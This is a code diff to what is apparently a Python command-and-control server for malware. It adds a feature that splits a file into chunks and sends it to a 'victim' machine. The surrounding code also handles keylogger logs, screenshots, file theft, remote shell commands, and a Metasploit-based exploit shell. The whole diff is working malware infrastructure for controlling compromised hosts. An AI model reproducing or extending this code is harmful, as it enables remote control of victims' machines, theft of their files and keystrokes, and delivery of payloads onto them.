@@ -22,7 +22,7 @@ class BaseShell(cmd.Cmd):
         pass
 
     def _print_log(self, count=100):
-        with open(LOG_PATH + datetime.now().strftime('%Y%m%d.txt'), 'r') as fr:
+        with open(LOG_PATH + datetime.now().strftime('%Y%m%d.txt'), 'r', encoding=ENCODING) as fr:
             log_data = fr.readlines()
 
         start_index = (len(log_data) - count) if (len(log_data) - count) > 0 else 0
@@ -110,6 +110,12 @@ class VictimShell(BaseShell):
             print(list(victim_table[self.targetIP]['command']))
         pass
 
+    def do_cancel(self, arg):
+        global victim_table
+        if arg.lower() == 'sendfile':
+            if victim_table[self.targetIP]['sendingFile'] != "":
+                SEQManager.deleteTmpData(self.targetIP + '_' + victim_table[self.targetIP]['sendingFile'])
+                victim_table[self.targetIP]['sendingFile'] = ""
     # screenshot, gf, keylogger를 get으로 통합하는 테스트 코드
     
     def do_get(self, arg):
@@ -136,14 +142,76 @@ class VictimShell(BaseShell):
             with open(FILE_PATH+last_argu, 'wb'):
                 pass
 
-            victim_table[self.targetIP]['command'].append('[file {}]'.format(" ".join(parsed_arg)))
+            victim_table[self.targetIP]['command'].append('[get file {}]'.format(" ".join(parsed_arg)))
         
 
+    def _split_sending_file(self, filePath, split_len=200):
+        split_len = int(split_len * 1e+6)
 
-    def do_sf(self, arg):
-        '''미구현'''
-        # TODO server to victim 파일 전송 구현하기
-        pass
+        with open(filePath, 'rb') as f:
+            data = f.read()
+
+        if '\\' in filePath:
+            filePath = filePath.split('\\')[-1]
+        if '/' in filePath:
+            filePath = filePath.split('/')[-1]
+        if '.' in filePath:
+            filePath = filePath.split('.')[0]
+
+        data_len = len(data)
+        #data_len = 452020100
+
+        send_count = int(data_len//split_len)
+        send_count += 1 if (data_len % split_len) > 0 else 0
+
+
+
+        if send_count == 0 or send_count == 1:
+            SEQManager.saveSeqData(self.targetIP + '_' + filePath, 0, data)
+            return
+
+        for i in range(1, send_count):
+            SEQManager.saveSeqData(self.targetIP + '_' + filePath, i, data[split_len*(i-1):split_len*i])
+        
+        SEQManager.saveSeqData(self.targetIP + '_' + filePath, 0xffffffff, data[split_len*(send_count-1):])
+
+        del data
+
+        return
+
+    def do_send(self, arg):
+        global victim_table
+        
+        if victim_table[self.targetIP]['sendingFile'] != "":
+            print('already seding')
+            return;
+
+
+        parsed_arg, arg_len = self._arg_parse(arg)
+
+        if arg_len != 3:
+            print('usage : send (file) [target] [save path & name]')
+            return
+            
+        if parsed_arg[0] == 'file':
+            if not path.isfile(parsed_arg[1]):
+                print('There is no file in {}'.format(parsed_arg[1]))
+                return
+            victim_table[self.targetIP]['command'].append('[send file {}]'.format(parsed_arg[-1]))
+
+            filePath = parsed_arg[1]
+
+            if '\\' in filePath:
+                filePath = filePath.split('\\')[-1]
+            if '/' in filePath:
+                filePath = filePath.split('/')[-1]
+            if '.' in filePath:
+                filePath = filePath.split('.')[0]
+
+            victim_table[self.targetIP]['sendingFile'] = filePath
+            self._split_sending_file(parsed_arg[1])
+            
+            return
 
 # 얻은 정보를 바탕으로 exploit을 검색하고 수행할 쉘
 class MetasploitShell(BaseShell):
@@ -225,6 +293,9 @@ class CNCServer(BaseHTTPRequestHandler):
 
         self._response_writer(DDP.raw('FTP_REQUEST', 0, data.encode(ENCODING)))
 
+    def _response_ftp_response(self, data, seq):
+        self._response_writer(DDP.raw('FTP_RESPONSE', seq, data), logging=False)
+
     # 응답 처리 및 응답 메시지 로깅
     def _response_writer(self, data : bytes, additional_header={}, logging=True):
         self.send_response(200)
@@ -251,7 +322,7 @@ class CNCServer(BaseHTTPRequestHandler):
         if not victim_name:
             victim_name = victim_ip
 
-        victim_table[victim_ip] = {'index' : str(victim_index), 'command' : deque(), 'seqName' : deque(), 'shQueue' : deque()}
+        victim_table[victim_ip] = {'index' : str(victim_index), 'command' : deque(), 'seqName' : deque(), 'shQueue' : deque(), 'sendingFile' : ''}
         victim_index += 1
 
     def _save_none_seq_file(self, victim_ip, data):
@@ -376,9 +447,12 @@ class CNCServer(BaseHTTPRequestHandler):
                 self._response_ddp_error('none seq file saving error')
                 return
 
-        # type별 함수 호출
-        type_function = getattr(self, "_func_"+parsed_data['type'].lower())
-        type_function(victim_ip, ddp_data)
+        try:
+            # type별 함수 호출
+            type_function = getattr(self, "_func_"+parsed_data['type'].lower())
+            type_function(victim_ip, ddp_data)
+        except:
+            self._response_ddp_error("invalid ddp type")
 
     def _func_error(self, victim_ip : str, ddp_data):
         # 파일 에러
@@ -407,13 +481,18 @@ class CNCServer(BaseHTTPRequestHandler):
                     self._response_ftp_request("keylog", victim_ip, "{}_{}_keylog.txt".format(victim_ip,datetime.now().strftime('%Y%m%d-%H%M%S')))
                     return
                 # gf 명령어 처리
-                elif data.startswith('[file'):
+                elif data.startswith('[get file'):
                     file_name = data.split(' ')
-                    if len(file_name) == 3:
+                    if len(file_name) == 4:
                         self._response_ftp_request(file_name[len(file_name)-2], victim_ip, file_name[len(file_name)-1][:-1])
                     else:
                         self._response_ftp_request(file_name[len(file_name)-1][:-1], victim_ip, file_name[len(file_name)-1][:-1])
                     return
+                elif data.startswith('[send file'):
+                    file_name = data.split(' ')
+                    self._response_shell_request(" ".join(file_name[1:])[:-1])
+                    # TODO send shell command
+                    pass
             # shell 명령어 처리
             else:
                 self._response_shell_request(data)
@@ -452,7 +531,6 @@ class CNCServer(BaseHTTPRequestHandler):
 
     # ftp 응답에 대한 처리 함수
     def _func_ftp_response(self, victim_ip : str, ddp_data):
-        # TODO file_path에 맞게 저장
         fileName = ""
 
         try:
@@ -473,15 +551,32 @@ class CNCServer(BaseHTTPRequestHandler):
                 Logger.error('{0} fileName Queue is empty!'.format(victim_ip))
                 return
             Logger.error('{0} seq save error : {1}'.format(fileName, str(e)))
+
+    def _func_ftp_request(self, victim_ip : str, ddp_data):
+        global victim_table
+        if victim_table[victim_ip]['sendingFile'] == "":
+            self._response_ddp_error('there is no file to send')
+            return;
+        
+        try:
+            seq, data = SEQManager.getSeqData(victim_ip + '_' + victim_table[victim_ip]['sendingFile'])
+            if seq == "0" or seq == str(0xffffffff):
+                victim_table[victim_ip]['sendingFile'] = ""
+
+            self._response_ftp_response(data, int(seq))
+        except Exception as e:
+            Logger.error('load sending file error {}'.format(str(e)))
+            SEQManager.deleteTmpData(victim_ip + '_' + victim_table[victim_ip]['sendingFile'])
+
         
 LOG_PATH = Logger.LOG_PATH
 FILE_PATH = './file/'
 TMP_FILE_PATH = SEQManager.TMP_FILE_PATH
 
 ENCODING = 'cp949'
-SERVER_INFO = ('172.17.242.56', 80)
+SERVER_INFO = ('172.24.128.64', 80)
 
-victim_table = {} # {ip : {index : [index num], command : [command queue], shCommand : [sh queue], seqName : [seqName queue]}}
+victim_table = {} # {ip : {index : [index num], command : [command queue], shCommand : [sh queue], seqName : [seqName queue], sendIndex : [file index]}}
 victim_index = 0
 
 
@@ -491,7 +586,7 @@ try:
 
     http_server_thread = threading.Thread(target=httpd.serve_forever)
     http_server_thread.daemon = True
-    http_server_thread.start()  
+    http_server_thread.start()
 except Exception as e:
     print('[!] HTTP Server Open Error / {}'.format(str(e)))
     exit(0)
